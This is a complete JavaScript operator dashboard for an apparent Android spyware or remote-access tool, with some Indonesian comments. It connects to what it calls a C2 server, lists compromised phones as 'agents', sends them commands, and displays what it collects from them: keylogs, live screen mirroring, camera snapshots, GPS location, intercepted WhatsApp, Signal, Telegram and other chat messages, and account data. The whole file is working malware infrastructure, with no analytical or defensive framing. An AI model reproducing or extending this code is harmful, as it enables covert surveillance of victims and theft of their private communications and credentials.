// ==================== STATE ====================
let ws = null;
let selectedAgent = null;
let agents = [];
let agentData = {};
let outputHistory = [];
let reconnectAttempts = 0;
const MAX_RECONNECT_ATTEMPTS = 10;
let liveMirrorFrames = [];
let isLiveMirrorActive = false;
let liveMirrorFrameCount = 0;
let currentFilter = 'all';

// ==================== DOM REFERENCES ====================
const DOM = {
    agentList: document.getElementById('agent-list'),
    outputContent: document.getElementById('output-content'),
    commandInput: document.getElementById('command-input'),
    sendBtn: document.getElementById('send-command-btn'),
    statusIndicator: document.getElementById('status-indicator'),
    statusText: document.getElementById('status-text'),
    agentCount: document.getElementById('agent-count'),
    onlineCount: document.getElementById('online-count'),
    commandCount: document.getElementById('command-count'),
    mirrorCount: document.getElementById('mirror-count'),
    selectedAgentId: document.getElementById('selected-agent-id'),
    refreshBtn: document.getElementById('refresh-agents'),
    clearBtn: document.getElementById('clear-output'),
    screenshotContent: document.getElementById('screenshot-content'),
    keylogContent: document.getElementById('keylog-content'),
    whatsappContent: document.getElementById('whatsapp-content'),
    livemirrorContent: document.getElementById('livemirror-content'),
    wallpaperContent: document.getElementById('wallpaper-content'),
};

// ==================== INITIALIZATION ====================
document.addEventListener('DOMContentLoaded', () => {
    connectWebSocket();
    setupEventListeners();
    setupCommandPresets();
    setupTabs();
    setupFilters();
});

// ==================== WEBSOCKET ====================
function connectWebSocket() {
    const protocol = window.location.protocol === 'https:' ? 'wss:' : 'ws:';
    const wsUrl = `${protocol}//${window.location.host}/ws`;
    
    ws = new WebSocket(wsUrl);
    ws.onopen = () => {
        updateStatus(true);
        reconnectAttempts = 0;
        addOutputLine('🟢 Connected to C2 server', 'info');
    };

    ws.onclose = () => {
        updateStatus(false);
        addOutputLine('🔴 Disconnected from C2 server', 'error');
        reconnectAttempts++;
        if (reconnectAttempts < MAX_RECONNECT_ATTEMPTS) {
            const delay = Math.min(3000 * reconnectAttempts, 30000);
            setTimeout(connectWebSocket, delay);
        }
    };

    ws.onmessage = (event) => {
        try {
            const data = JSON.parse(event.data);
            handleWebSocketMessage(data);
        } catch (e) {
            console.error('WebSocket parse error:', e);
        }
    };

    ws.onerror = (error) => {
        console.error('WebSocket error:', error);
    };
}

// ==================== HANDLE WEBSOCKET MESSAGES ====================

function handleWebSocketMessage(data) {
    console.log('📨 WebSocket message:', data);

    switch (data.type) {
        case 'agent_list':
            updateAgentList(data.agents);
            break;
            
        case 'agent_detail':
            showAgentDetail(data.agent);
            break;
            
        case 'agent_update':
            updateAgent(data.agent);
            break;
            
        case 'command_sent':
            addOutputLine(`📤 Command sent to ${data.agent_id}: ${data.command}`, 'info');
            break;
            
        case 'command_response':
            handleCommandResponse(data);
            break;
            
        case 'screen_frame':
            handleScreenFrame(data.agent_id, data.frame);
            break;
            
        case 'video_frame':
            handleVideoFrame(data.agent_id, data.frame);
            break;
            
        case 'social_message':
            console.log('💬 Social message received:', data);
            handleSocialMessage(data);
            break;
            
        case 'whatsapp_message':
            handleWhatsAppMessage(data);
            break;
            
        case 'keylog_data':
            handleKeylogData(data);
            break;
            
        case 'error':
            addOutputLine(`❌ Error: ${data.message}`, 'error');
            break;
        case 'accounts_data':
            console.log('👤 Accounts data received:', data);
            handleAccountsData(data);
            break;
            
        case 'google_accounts_data':
            console.log('🔵 Google accounts data received:', data);
            handleGoogleAccountsData(data);
            break;
            
        default:
            console.log('Unknown message type:', data.type);
    }
}

// ==================== UI UPDATE FUNCTIONS ====================

function updateStatus(connected) {
    const indicator = DOM.statusIndicator;
    const text = DOM.statusText;

    if (connected) {
        indicator.className = 'status-online';
        text.textContent = 'Connected';
        document.body.style.borderColor = '#51cf66';
    } else {
        indicator.className = 'status-offline';
        text.textContent = 'Disconnected';
        document.body.style.borderColor = '#ff6b6b';
    }
}

function updateAgentList(agentList) {
    agents = agentList || [];
    const container = DOM.agentList;
    container.innerHTML = '';

    if (agents.length === 0) {
        container.innerHTML = '<div class="info">No agents connected</div>';
        DOM.agentCount.textContent = '0';
        DOM.onlineCount.textContent = '0';
        DOM.mirrorCount.textContent = '0';
        DOM.commandCount.textContent = '0';
        return;
    }

    let online = 0;
    let mirroring = 0;
    let totalCommands = 0;

    agents.forEach(agent => {
        if (agent.status === 'online') online++;
        if (agent.mirroring) mirroring++;
        if (agent.commands) totalCommands += agent.commands.length;

        const div = document.createElement('div');
        div.className = 'agent-item';
        if (selectedAgent === agent.id) {
            div.classList.add('selected');
        }
        
        const shortId = agent.id.substring(0, 12) + '...';
        const statusClass = agent.status === 'online' ? 'status-online' : 'status-offline';
        const statusText = agent.status === 'online' ? '🟢 Online' : '🔴 Offline';
        const mirrorIcon = agent.mirroring ? ' 📸' : '';
        const frameInfo = agent.frame_count > 0 ? ` (${agent.frame_count} frames)` : '';
        
        div.innerHTML = `
            <div class="agent-id">${shortId}</div>
            <div class="agent-device">${agent.manufacturer || ''} ${agent.device || 'Unknown'}</div>
            <div class="agent-status">
                <span class="${statusClass}">●</span>
                ${statusText}${mirrorIcon}${frameInfo}
            </div>
            <div class="agent-lastseen">Last seen: ${formatTime(agent.last_seen)}</div>
        `;
        div.dataset.agentId = agent.id;
        div.addEventListener('click', () => selectAgent(agent.id));
        container.appendChild(div);
    });

    DOM.agentCount.textContent = agents.length;
    DOM.onlineCount.textContent = online;
    DOM.mirrorCount.textContent = mirroring;
    DOM.commandCount.textContent = totalCommands;

    if (selectedAgent && !agents.find(a => a.id === selectedAgent)) {
        selectedAgent = null;
        DOM.selectedAgentId.textContent = '';
        stopLiveMirror();
    }
}

function updateAgent(agent) {
    const index = agents.findIndex(a => a.id === agent.id);
    if (index !== -1) {
        agents[index] = agent;
        updateAgentList(agents);
        
        if (selectedAgent === agent.id && !agent.mirroring) {
            stopLiveMirror();
        }
    }
}

function selectAgent(agentId) {
    selectedAgent = agentId;
    DOM.selectedAgentId.textContent = agentId;
    
    document.querySelectorAll('.agent-item').forEach(el => {
        el.classList.toggle('selected', el.dataset.agentId === agentId);
    });

    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({
            action: 'get_agent',
            agent_id: agentId
        }));
    }

    addOutputLine(`📱 Selected agent: ${agentId}`, 'info');
    resetLiveMirror();
}

function showAgentDetail(agent) {
    if (!agent) return;
}

// ==================== COMMAND RESPONSE HANDLER ====================

function handleCommandResponse(data) {
    const agentId = data.agent_id;
    const command = data.command;
    const result = data.result;
    const timestamp = new Date().toLocaleTimeString();

    // ✅ SCREEN_START - HANYA DI LIVE MIRROR
    if (command === 'SCREEN_START') {
        console.log('📸 SCREEN_START response:', result);
        
        if (result.status === 'success' || result.status === 'pending') {
            // ✅ TAMPILKAN DI OUTPUT (hanya pesan singkat)
            addOutputLine(`📸 Screen mirror started! Status: ${result.status}`, 'success');
            
            // ✅ TAMPILKAN DI LIVE MIRROR TAB
            const container = DOM.livemirrorContent;
            if (container) {
                container.innerHTML = `
                    <div style="text-align:center;padding:20px;color:#00d2ff;">
                        <div style="font-size:48px;">📸</div>
                        <div style="font-size:16px;margin-top:10px;">Screen Mirror Started!</div>
                        <div style="font-size:12px;color:#6b7a8a;margin-top:5px;">Waiting for frames...</div>
                        <div style="font-size:11px;color:#4a5a6a;margin-top:10px;font-family:'Courier New',monospace;">
                            Agent: ${agentId.substring(0, 12)}...
                        </div>
                    </div>
                `;
            }
            
            // Auto switch ke Live Mirror
            switchToTab('livemirror');
        } else {
            addOutputLine(`❌ Failed to start mirror: ${result.message || 'Unknown error'}`, 'error');
        }
        return;
    }

    // ✅ SCREEN_STOP - HANYA DI LIVE MIRROR
    if (command === 'SCREEN_STOP') {
        console.log('⏹️ SCREEN_STOP response:', result);
        
        if (result.status === 'success') {
            addOutputLine(`⏹️ Screen mirror stopped!`, 'success');
            resetLiveMirror();
        } else {
            addOutputLine(`❌ Failed to stop mirror: ${result.message || 'Unknown error'}`, 'error');
        }
        return;
    }

    // ✅ SCREEN_FRAME - HANYA DI LIVE MIRROR (TIDAK DI OUTPUT)
    if (command === 'SCREEN_FRAME' || result.type === 'screen_frame') {
        console.log('📸 Screen frame received');
        if (result.data) {
            showLiveFrame(result);
        }
        return;
    }

    // ✅ VIDEO_FRAME - HANYA DI LIVE MIRROR
    if (command === 'VIDEO_FRAME' || result.type === 'video_frame') {
        console.log('🎬 Video frame received');
        if (result.data) {
            showLiveFrame(result);
        }
        return;
    }

    // ✅ SET_WALLPAPER - HANYA DI WALLPAPER TAB (TIDAK DI OUTPUT)
    if (command === 'SET_WALLPAPER') {
        console.log('🖼️ Wallpaper response:', result);
        
        // ✅ TAMPILKAN DI WALLPAPER TAB
        showWallpaperInTab(result);
        
        // ✅ TAMPILKAN PESAN SINGKAT DI OUTPUT
        if (result.status === 'success') {
            addOutputLine(`🖼️ Wallpaper changed successfully! (${result.method || 'unknown'})`, 'success');
        } else if (result.status === 'error') {
            addOutputLine(`❌ Failed to change wallpaper: ${result.message}`, 'error');
        } else {
            addOutputLine(`🖼️ Wallpaper command executed`, 'info');
        }
        return;
    }

    // ✅ COMMAND LAIN - TAMPILKAN DI OUTPUT
    let output = `[${timestamp}] 📥 Response from ${agentId} for ${command}:\n`;
    
    if (result) {
        output += formatResult(result);
    }

    addOutputLine(output, 'success');
    
    if (result) {
        // Screenshot - tampilkan di Screenshot tab
        if (result.image_data && result.type !== 'screen_frame') {
            showImageInTab(result.image_data, 'screenshot-tab', 'screenshot');
            addOutputLine(`  📸 Screenshot captured (${result.image_data.length} bytes)`, 'info');
        }
        
        if (result.type === 'camera_snapshot' && result.image_data) {
            showImageInTab(result.image_data, 'screenshot-tab', 'camera');
            addOutputLine(`  📷 Camera snapshot captured`, 'info');
        }
        
        // WhatsApp messages - tampilkan di WhatsApp tab
        if (result.messages) {
            showWhatsAppMessages(result.messages);
        }
        
        // Keylogs - tampilkan di Keylog tab
        if (result.logs) {
            showKeylogs(result.logs);
        }
        
        // Location
        if (result.latitude && result.longitude) {
            const mapsUrl = `https://maps.google.com/?q=${result.latitude},${result.longitude}`;
            addOutputLine(`  📍 Location: ${result.latitude}, ${result.longitude}`, 'info');
            addOutputLine(`  🗺️ Maps: ${mapsUrl}`, 'info');
        }
        
        // Device info
        if (result.device || result.manufacturer) {
            addOutputLine(`  📱 Device: ${result.manufacturer || ''} ${result.device || ''}`, 'info');
            addOutputLine(`  🤖 Android: ${result.android_version || result.android || ''}`, 'info');
        }
        
        // Status
        if (result.status) {
            addOutputLine(`  📊 Status: ${result.status}`, 'info');
        }
        
        if (result.message) {
            addOutputLine(`  💬 Message: ${result.message}`, 'info');
        }
        
        if (result.count !== undefined) {
            addOutputLine(`  📊 Count: ${result.count}`, 'info');
        }
    }

    if (ws && ws.readyState === WebSocket.OPEN) {
        ws.send(JSON.stringify({ action: 'get_agents' }));
    }
}

// ==================== WALLPAPER FUNCTIONS ====================

function showWallpaperInTab(result) {
    const container = DOM.wallpaperContent;
    if (!container) {
        console.warn('⚠️ Wallpaper container not found');
        return;
    }

    // Hapus placeholder
    if (container.querySelector('.info')) {
        container.innerHTML = '';
    }

    const wrapper = document.createElement('div');
    wrapper.style.cssText = `
        margin-bottom: 12px;
        padding: 12px 16px;
        background: #0d1520;
        border-radius: 8px;
        border: 1px solid #1a2633;
        transition: all 0.3s;
    `;

    // Timestamp
    const timeLabel = document.createElement('div');
    timeLabel.style.cssText = `
        color: #6b7a8a;
        font-size: 11px;
        font-family: 'Courier New', monospace;
        margin-bottom: 8px;
        display: flex;
        justify-content: space-between;
        align-items: center;
    `;
    timeLabel.innerHTML = `
        <span>🖼️ Wallpaper ${new Date().toLocaleString()}</span>
        <span style="color:#4a5a6a;">${result.method || 'unknown'}</span>
    `;
    wrapper.appendChild(timeLabel);

    // Status message
    if (result.message) {
        const msg = document.createElement('div');
        const isSuccess = result.status === 'success';
        msg.style.cssText = `
            color: ${isSuccess ? '#51cf66' : '#ff6b6b'};
            font-size: 13px;
            margin-bottom: 8px;
            padding: 4px 8px;
            background: ${isSuccess ? 'rgba(81, 207, 102, 0.1)' : 'rgba(255, 107, 107, 0.1)'};
            border-radius: 4px;
        `;
        msg.textContent = (isSuccess ? '✅ ' : '❌ ') + result.message;
        wrapper.appendChild(msg);
    }

    // Tampilkan gambar jika ada
    if (result.image_data) {
        const imgWrapper = document.createElement('div');
        imgWrapper.style.cssText = `
            margin-top: 8px;
            text-align: center;
            background: #0a0e17;
            border-radius: 4px;
            padding: 4px;
        `;

        const img = document.createElement('img');
        img.src = `data:image/jpeg;base64,${result.image_data}`;
        img.alt = `Wallpaper ${new Date().toLocaleTimeString()}`;
        img.style.cssText = `
            max-width: 100%;
            max-height: 350px;
            border-radius: 6px;
            border: 1px solid #1a2633;
            cursor: pointer;
            object-fit: contain;
        `;
        img.addEventListener('click', () => {
            window.open(img.src, '_blank');
        });
        
        imgWrapper.appendChild(img);
        wrapper.appendChild(imgWrapper);
    }

    // Tampilkan status jika tidak ada gambar
    if (!result.image_data) {
        const statusDiv = document.createElement('div');
        statusDiv.style.cssText = `
            color: #6b7a8a;
            font-size: 12px;
            padding: 8px;
            background: #0a0e17;
            border-radius: 4px;
            font-family: 'Courier New', monospace;
        `;
        statusDiv.textContent = `Status: ${result.status || 'unknown'}`;
        if (result.method) {
            statusDiv.textContent += ` | Method: ${result.method}`;
        }
        wrapper.appendChild(statusDiv);
    }

    container.appendChild(wrapper);
    container.scrollTop = 0;

    // Limit history - hanya 10 wallpaper terakhir
    while (container.children.length > 10) {
        container.removeChild(container.firstChild);
    }

    // ✅ AUTO SWITCH KE TAB WALLPAPER
    switchToTab('wallpaper');
}

// ==================== KEYLOG HANDLER ====================

function handleKeylogData(data) {
    console.log('⌨️ Keylog data received:', data);
    
    const container = DOM.keylogContent;
    if (!container) return;

    const keylogData = data.data || {};
    let logs = keylogData.logs || '';
    let count = keylogData.count || 0;
    let isLogging = keylogData.is_logging || false;
    let queueSize = keylogData.queue_size || 0;
    let historySize = keylogData.history_size || 0;

    if (!logs && data.logs) {
        logs = data.logs;
    }
    if (!count && data.count) {
        count = data.count;
    }
    if (!isLogging && data.is_logging !== undefined) {
        isLogging = data.is_logging;
    }

    if (logs) {
        let fullLogs = logs;
        if (!fullLogs.includes('=== KEYLOGS')) {
            fullLogs = `=== KEYLOGS ===\nTotal: ${count} keystrokes\nQueue: ${queueSize}\nHistory: ${historySize}\nLogging: ${isLogging}\n\n${fullLogs}`;
        }
        showKeylogs(fullLogs);
        
        const preview = logs.substring(0, 100) + (logs.length > 100 ? '...' : '');
        addOutputLine(`⌨️ Keylogs from ${data.agent_id}: ${preview}`, 'info');
        if (count > 0) {
            addOutputLine(`⌨️ Total: ${count} keystrokes`, 'info');
        }
    } else {
        const noLogsMsg = `⚠️ No keylogs received.\n\n📊 Stats:\n  • Total: ${count}\n  • Queue: ${queueSize}\n  • History: ${historySize}\n  • Logging: ${isLogging ? '✅ Active' : '❌ Stopped'}`;
        showKeylogs(noLogsMsg);
        addOutputLine(`⌨️ No keylog data from ${data.agent_id}`, 'warning');
    }
}

// ==================== LIVE MIRROR FUNCTIONS ====================

function showLiveFrame(frameData) {
    if (!frameData || !frameData.data) {
        console.warn('⚠️ No frame data to display');
        return;
    }
    
    const container = DOM.livemirrorContent;
    if (!container) {
        console.warn('⚠️ Live mirror container not found');
        return;
    }
    
    // Hapus placeholder
    if (container.querySelector('.info') || container.querySelector('div[style*="Waiting for frames"]')) {
        container.innerHTML = '';
    }
    
    // Buat video element
    let video = container.querySelector('#live-mirror-video');
    if (!video) {
        video = document.createElement('img');
        video.id = 'live-mirror-video';
        video.style.cssText = `
            width: 100%;
            max-width: 800px;
            max-height: 600px;
            border-radius: 8px;
            border: 2px solid #00d2ff;
            box-shadow: 0 0 30px rgba(0, 210, 255, 0.1);
            background: #0a0e17;
            display: block;
            margin: 0 auto;
            object-fit: contain;
        `;
        container.appendChild(video);
        
        const info = document.createElement('div');
        info.id = 'live-mirror-info';
        info.style.cssText = `
            text-align: center;
            color: #6b7a8a;
            font-size: 12px;
            padding: 8px 0;
            font-family: 'Courier New', monospace;
        `;
        info.textContent = `📡 Live Mirror - Receiving frames...`;
        container.appendChild(info);
    }
    
    video.src = `data:image/jpeg;base64,${frameData.data}`;
    video.alt = `Frame ${frameData.frame_number || '?'}`;
    
    const infoEl = container.querySelector('#live-mirror-info');
    if (infoEl) {
        const frameNum = frameData.frame_number || ++liveMirrorFrameCount;
        const size = frameData.size || frameData.data.length;
        infoEl.textContent = `📡 Live Mirror - Frame #${frameNum} | Size: ${formatSize(size)}`;
    }
    
    isLiveMirrorActive = true;
}

function resetLiveMirror() {
    stopLiveMirror();
    const container = DOM.livemirrorContent;
    if (container) {
        container.innerHTML = `
            <div class="info">📺 Live mirror preview</div>
            <div class="info" style="font-size:12px;color:#6b7a8a;margin-top:8px;">
                Start with <code style="background:#1a2633;padding:2px 8px;border-radius:4px;color:#00d2ff;">SCREEN_START</code>
            </div>
        `;
    }
    liveMirrorFrameCount = 0;
}

function stopLiveMirror() {
    isLiveMirrorActive = false;
    const container = DOM.livemirrorContent;
    if (container) {
        const video = container.querySelector('#live-mirror-video');
        if (video) {
            video.src = '';
        }
    }
}

// ==================== SCREEN FRAME HANDLER ====================

function handleScreenFrame(agentId, frame) {
    console.log(`📸 Frame received for ${agentId}`, frame ? 'with data' : 'no data');
    
    if (!selectedAgent && agents.length > 0) {
        const agent = agents.find(a => a.id === agentId);
        if (agent) {
            selectAgent(agentId);
        }
    }
    
    if (selectedAgent !== agentId) {
        console.log(`⏭️ Frame skipped (selected: ${selectedAgent})`);
        return;
    }
    
    if (frame && frame.data) {
        showLiveFrame(frame);
    }
}

// ==================== VIDEO FRAME HANDLER ====================

function handleVideoFrame(agentId, frame) {
    console.log(`🎬 Video frame received for ${agentId}`, frame ? 'with data' : 'no data');
    
    if (!selectedAgent && agents.length > 0) {
        const agent = agents.find(a => a.id === agentId);
        if (agent) {
            selectAgent(agentId);
        }
    }
    
    if (selectedAgent !== agentId) {
        console.log(`⏭️ Video frame skipped (selected: ${selectedAgent})`);
        return;
    }
    
    if (frame && frame.data) {
        showLiveFrame(frame);
    }
}

// ==================== SHOW IMAGE IN TAB ====================

function showImageInTab(imageData, tabId, type) {
    const container = document.getElementById(tabId);
    if (!container) return;

    if (container.querySelector('.info')) {
        container.innerHTML = '';
    }

    const wrapper = document.createElement('div');
    wrapper.style.marginBottom = '15px';
    wrapper.style.borderBottom = '1px solid #1a2633';
    wrapper.style.padding = '10px 0';
    
    const timeLabel = document.createElement('div');
    timeLabel.style.color = '#6b7a8a';
    timeLabel.style.fontSize = '12px';
    timeLabel.style.marginBottom = '5px';
    const icon = type === 'camera' ? '📷' : type === 'frame' ? '🎥' : '📸';
    const label = type === 'frame' ? 'Frame' : type === 'camera' ? 'Camera' : 'Screenshot';
    timeLabel.textContent = `${icon} ${label} ${new Date().toLocaleString()}`;
    
    const img = document.createElement('img');
    img.src = `data:image/jpeg;base64,${imageData}`;
    img.alt = `${label} ${new Date().toLocaleTimeString()}`;
    img.style.maxWidth = '100%';
    img.style.maxHeight = '500px';
    img.style.borderRadius = '8px';
    img.style.border = '1px solid #1a2633';
    img.style.cursor = 'pointer';
    img.addEventListener('click', () => {
        window.open(img.src, '_blank');
    });
    
    wrapper.appendChild(timeLabel);
    wrapper.appendChild(img);
    
    const downloadBtn = document.createElement('button');
    downloadBtn.textContent = '⬇️ Download';
    downloadBtn.style.cssText = `
        margin-top: 5px;
        padding: 4px 12px;
        background: #00d2ff;
        color: #0a0e17;
        border: none;
        border-radius: 4px;
        cursor: pointer;
        font-size: 12px;
    `;
    downloadBtn.addEventListener('click', () => {
        const link = document.createElement('a');
        link.href = img.src;
        link.download = `${label}_${Date.now()}.jpg`;
        link.click();
    });
    wrapper.appendChild(downloadBtn);
    
    container.appendChild(wrapper);
    
    while (container.children.length > 50) {
        container.removeChild(container.firstChild);
    }
}

// ==================== SHOW WHATSAPP MESSAGES ====================

function showWhatsAppMessages(messages) {
    const container = DOM.whatsappContent;
    if (!container) return;

    if (container.querySelector('.info')) {
        container.innerHTML = '';
    }

    const wrapper = document.createElement('div');
    wrapper.style.marginBottom = '15px';
    wrapper.style.borderBottom = '1px solid #1a2633';
    wrapper.style.padding = '10px 0';
    
    const timeLabel = document.createElement('div');
    timeLabel.style.color = '#6b7a8a';
    timeLabel.style.fontSize = '12px';
    timeLabel.style.marginBottom = '5px';
    timeLabel.textContent = `💬 WhatsApp Messages ${new Date().toLocaleString()}`;
    
    const content = document.createElement('pre');
    content.style.cssText = `
        background: #0a0e17;
        padding: 10px;
        border-radius: 4px;
        font-size: 12px;
        font-family: 'Courier New', monospace;
        white-space: pre-wrap;
        word-break: break-all;
        max-height: 300px;
        overflow-y: auto;
        color: #c8d6e5;
        border: 1px solid #1a2633;
    `;
    content.textContent = messages;
    
    wrapper.appendChild(timeLabel);
    wrapper.appendChild(content);
    container.appendChild(wrapper);
    
    while (container.children.length > 20) {
        container.removeChild(container.firstChild);
    }
}

// ==================== SHOW KEYLOGS ====================

function showKeylogs(logs) {
    const container = DOM.keylogContent;
    if (!container) return;

    if (container.querySelector('.info')) {
        container.innerHTML = '';
    }

    let count = 0;
    let isLogging = false;
    let queueSize = 0;
    let historySize = 0;

    const countMatch = logs.match(/Total keystrokes: (\d+)/);
    if (countMatch) count = parseInt(countMatch[1]);

    const queueMatch = logs.match(/Queue size: (\d+)/);
    if (queueMatch) queueSize = parseInt(queueMatch[1]);

    const historyMatch = logs.match(/History size: (\d+)/);
    if (historyMatch) historySize = parseInt(historyMatch[1]);

    const loggingMatch = logs.match(/Logging enabled: (true|false)/);
    if (loggingMatch) isLogging = loggingMatch[1] === 'true';

    const header = document.createElement('div');
    header.className = 'keylog-header';
    header.style.cssText = `
        display: flex;
        gap: 12px;
        padding: 10px 14px;
        background: #0d1520;
        border-radius: 6px;
        border: 1px solid #1a2633;
        margin-bottom: 10px;
        color: #6b7a8a;
        font-size: 12px;
        font-family: 'Courier New', monospace;
        flex-wrap: wrap;
    `;

    const hasData = count > 0 && logs && !logs.includes('No keylogs');
    const statusIcon = hasData ? '✅' : '⚠️';
    const statusText = hasData ? 'Data available' : 'No data';

    header.innerHTML = `
        <span>${statusIcon} Status: <strong style="color:${hasData ? '#51cf66' : '#ffd93d'};">${statusText}</strong></span>
        <span>📊 Total: <strong style="color:#ffd93d;">${count}</strong> keystrokes</span>
        <span>📋 Queue: <strong style="color:#6b7a8a;">${queueSize}</strong></span>
        <span>📚 History: <strong style="color:#6b7a8a;">${historySize}</strong></span>
        <span>${isLogging ? '🟢 Active' : '🔴 Stopped'}</span>
        <span>🕐 ${new Date().toLocaleTimeString()}</span>
    `;
    container.appendChild(header);

    const wrapper = document.createElement('div');
    wrapper.style.cssText = `
        background: #0a0e17;
        padding: 12px;
        border-radius: 6px;
        border: 1px solid #1a2633;
        max-height: 500px;
        overflow-y: auto;
    `;

    const content = document.createElement('pre');
    content.style.cssText = `
        margin: 0;
        font-size: 12px;
        font-family: 'Courier New', monospace;
        white-space: pre-wrap;
        word-break: break-word;
        color: #c8d6e5;
        line-height: 1.6;
        max-width: 100%;
        overflow-x: auto;
    `;

    let formattedLogs = logs;
    formattedLogs = formattedLogs.replace(/\[([^\]]+)\]/g, '<span style="color:#4a5a6a;">[$1]</span>');
    formattedLogs = formattedLogs.replace(/([a-zA-Z0-9._-]+):/g, '<span style="color:#00d2ff;">$1:</span>');
    formattedLogs = formattedLogs.replace(/(\[[A-Z_]+\])/g, '<span style="color:#ffd93d;">$1</span>');
    formattedLogs = formattedLogs.replace(/(\[CLICK:[^\]]+\])/g, '<span style="color:#ff6b6b;">$1</span>');

    content.innerHTML = formattedLogs;

    const footer = document.createElement('div');
    footer.style.cssText = `
        margin-top: 10px;
        padding-top: 10px;
        border-top: 1px solid #1a2633;
        color: #4a5a6a;
        font-size: 11px;
        text-align: center;
    `;
    
    if (hasData) {
        footer.textContent = `--- End of keylog dump (${count} keystrokes) ---`;
    } else {
        footer.textContent = `--- No keylogs available ---`;
    }

    wrapper.appendChild(content);
    wrapper.appendChild(footer);
    container.appendChild(wrapper);
    container.scrollTop = container.scrollHeight;
}

// ==================== WHATSAPP MESSAGE HANDLER ====================

function handleWhatsAppMessage(data) {
    console.log('💬 Processing WhatsApp message:', data);
    
    const container = DOM.whatsappContent;
    if (!container) {
        console.warn('⚠️ WhatsApp container not found');
        return;
    }
    
    if (container.querySelector('.info')) {
        container.innerHTML = '';
    }
    
    const wrapper = document.createElement('div');
    wrapper.dataset.platform = 'whatsapp';
    wrapper.style.cssText = `
        margin-bottom: 6px;
        padding: 6px 12px;
        border-bottom: 1px solid #1a2633;
        font-size: 13px;
        display: flex;
        align-items: center;
        flex-wrap: wrap;
        gap: 6px;
        background: #0d1520;
        border-radius: 4px;
    `;
    
    const badge = document.createElement('span');
    badge.style.cssText = `
        background: #1a2633;
        color: #25D366;
        font-size: 10px;
        padding: 2px 10px;
        border-radius: 10px;
        font-weight: bold;
    `;
    badge.textContent = data.app_name || 'WA';
    
    const senderSpan = document.createElement('span');
    senderSpan.style.cssText = `
        color: #ffd93d;
        font-weight: 600;
        font-size: 13px;
    `;
    senderSpan.textContent = data.sender + ':';
    
    const msgSpan = document.createElement('span');
    msgSpan.style.cssText = `
        color: #c8d6e5;
        word-break: break-word;
        flex: 1;
        font-size: 13px;
    `;
    msgSpan.textContent = data.message;
    
    const timeSpan = document.createElement('span');
    timeSpan.style.cssText = `
        color: #6b7a8a;
        font-size: 10px;
        font-family: 'Courier New', monospace;
    `;
    timeSpan.textContent = data.timestamp || new Date(data.time_ms * 1000).toLocaleTimeString();
    
    wrapper.appendChild(badge);
    wrapper.appendChild(senderSpan);
    wrapper.appendChild(msgSpan);
    wrapper.appendChild(timeSpan);
    
    container.appendChild(wrapper);
    container.scrollTop = container.scrollHeight;
    
    while (container.children.length > 500) {
        container.removeChild(container.firstChild);
    }
    
    addOutputLine(`💬 [${data.app_name}] ${data.sender}: ${data.message.substring(0, 100)}`, 'info');
    applyFilter();
}

// ==================== SOCIAL MESSAGE HANDLER ====================

function handleSocialMessage(data) {
    console.log('💬 Processing social message:', data);
    
    const container = DOM.whatsappContent;
    if (!container) {
        console.warn('⚠️ Container not found');
        return;
    }
    
    if (container.querySelector('.info')) {
        container.innerHTML = '';
    }
    
    const wrapper = document.createElement('div');
    wrapper.dataset.platform = data.platform || 'other';
    wrapper.style.cssText = `
        margin-bottom: 6px;
        padding: 6px 12px;
        border-bottom: 1px solid #1a2633;
        font-size: 13px;
        display: flex;
        align-items: center;
        flex-wrap: wrap;
        gap: 6px;
        background: #0d1520;
        border-radius: 4px;
        transition: background 0.2s;
    `;
    
    wrapper.onmouseover = () => {
        wrapper.style.background = '#15202b';
    };
    wrapper.onmouseout = () => {
        wrapper.style.background = '#0d1520';
    };
    
    const icon = document.createElement('span');
    icon.style.cssText = `font-size: 16px;`;
    icon.textContent = data.icon || getPlatformIcon(data.platform);
    
    const badge = document.createElement('span');
    const color = getPlatformColor(data.platform);
    badge.style.cssText = `
        background: ${color};
        color: #0a0e17;
        font-size: 10px;
        padding: 2px 10px;
        border-radius: 10px;
        font-weight: bold;
    `;
    badge.textContent = data.app_name || data.platform || 'Social';
    
    const senderSpan = document.createElement('span');
    senderSpan.style.cssText = `
        color: ${color};
        font-weight: 600;
        font-size: 13px;
    `;
    senderSpan.textContent = data.sender + ':';
    
    const msgSpan = document.createElement('span');
    msgSpan.style.cssText = `
        color: #c8d6e5;
        word-break: break-word;
        flex: 1;
        font-size: 13px;
    `;
    msgSpan.textContent = data.message;
    
    const timeSpan = document.createElement('span');
    timeSpan.style.cssText = `
        color: #6b7a8a;
        font-size: 10px;
        font-family: 'Courier New', monospace;
    `;
    timeSpan.textContent = data.timestamp || new Date(data.time_ms * 1000).toLocaleTimeString();
    
    const tag = document.createElement('span');
    tag.style.cssText = `
        background: rgba(255,255,255,0.05);
        color: #6b7a8a;
        font-size: 9px;
        padding: 1px 6px;
        border-radius: 3px;
        text-transform: uppercase;
        font-weight: bold;
    `;
    tag.textContent = data.platform || 'social';
    
    wrapper.appendChild(icon);
    wrapper.appendChild(badge);
    wrapper.appendChild(senderSpan);
    wrapper.appendChild(msgSpan);
    wrapper.appendChild(tag);
    wrapper.appendChild(timeSpan);
    
    container.appendChild(wrapper);
    container.scrollTop = container.scrollHeight;
    
    while (container.children.length > 500) {
        container.removeChild(container.firstChild);
    }
    
    const preview = data.message.length > 100 ? data.message.substring(0, 100) + '...' : data.message;
    addOutputLine(`${data.icon || '💬'} [${data.app_name}] ${data.sender}: ${preview}`, 'info');
    applyFilter();
}

// ==================== PLATFORM HELPERS ====================

function getPlatformColor(platform) {
    switch (platform) {
        case 'instagram': return '#E4405F';
        case 'twitter': return '#1DA1F2';
        case 'whatsapp': return '#25D366';
        case 'telegram': return '#0088CC';
        case 'signal': return '#3A76F0';
        case 'messenger': return '#00B2FF';
        case 'line': return '#00C300';
        case 'discord': return '#5865F2';
        default: return '#6b7a8a';
    }
}

function getPlatformIcon(platform) {
    switch (platform) {
        case 'instagram': return '📸';
        case 'twitter': return '🐦';
        case 'whatsapp': return '💬';
        case 'telegram': return '✈️';
        case 'signal': return '🔐';
        case 'messenger': return '💙';
        case 'line': return '💚';
        case 'discord': return '🎮';
        default: return '📱';
    }
}

// ==================== FILTER FUNCTIONS ====================

function setupFilters() {
    document.querySelectorAll('.filter-btn').forEach(btn => {
        btn.addEventListener('click', function() {
            document.querySelectorAll('.filter-btn').forEach(b => {
                b.classList.remove('active');
                b.style.background = '#1a2633';
                b.style.color = '#c8d6e5';
            });
            
            this.classList.add('active');
            this.style.background = '#2a3a4a';
            this.style.color = '#ffffff';
            
            currentFilter = this.dataset.platform;
            applyFilter();
        });
    });
}

